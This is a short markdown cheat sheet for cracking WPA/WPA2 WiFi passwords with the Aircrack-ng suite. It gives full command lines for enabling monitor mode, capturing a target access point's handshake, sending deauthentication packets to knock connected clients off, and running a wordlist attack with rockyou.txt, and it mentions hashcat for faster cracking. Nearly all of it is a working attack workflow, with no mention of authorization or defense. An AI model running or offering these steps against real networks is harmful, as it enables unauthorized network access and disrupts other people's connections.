# WiFi Cracking Cheat Sheet

A step-by-step guide for capturing WPA/WPA2 handshakes and cracking WiFi passwords using the Aircrack-ng suite.

---

## 1. Interface Setup with Airmon-ng

```bash
sudo airmon-ng           # List wireless interfaces
sudo airmon-ng check kill  # Kill processes that might interfere
sudo airmon-ng start <interface>  # Enable monitor mode (creates <interface>mon)
```

---

## 2. Scanning Networks with Airodump-ng

```bash
sudo airodump-ng <interface>mon  # Show all available networks
```

To focus on a specific network and capture handshakes:
```bash
sudo airodump-ng -c <channel> --bssid <AP_MAC> -w <capture_file> <interface>mon
```
- `<channel>`: Channel of the target AP
- `<AP_MAC>`: BSSID (MAC address) of the access point
- `<capture_file>`: Output file for handshake

---

## 3. Forcing Handshake Capture with Aireplay-ng

Send deauthentication packets to force clients to reconnect (and capture handshake):

```bash
sudo aireplay-ng -0 <num_deauths> -a <AP_MAC> -c <client_MAC> <interface>mon
```
- `-0`: Deauth attack
- `<num_deauths>`: Number of deauth packets (e.g., 10)
- `<AP_MAC>`: BSSID of the AP
- `<client_MAC>`: MAC of a connected client (optional, omit to target all)
- `<interface>mon`: Monitor mode interface

---

## 4. Cracking the Handshake with Aircrack-ng

```bash
sudo aircrack-ng -b <AP_MAC> -w <wordlist> <capture_file>.cap
```
- `-b`: BSSID of the AP
- `-w`: Path to password wordlist (e.g., `/usr/share/wordlists/rockyou.txt`)
- `<capture_file>.cap`: Capture file from airodump-ng

---

## Tips

- Use a good wordlist, e.g., `/usr/share/wordlists/rockyou.txt` or SecLists.
- Make sure your wireless card supports monitor mode and packet injection.
- You can use `hcxpcaptool` and `hashcat` for faster GPU-based cracking.

---

## References

- [airmon-ng](https://www.aircrack-ng.org/doku.php?id=airmon-ng)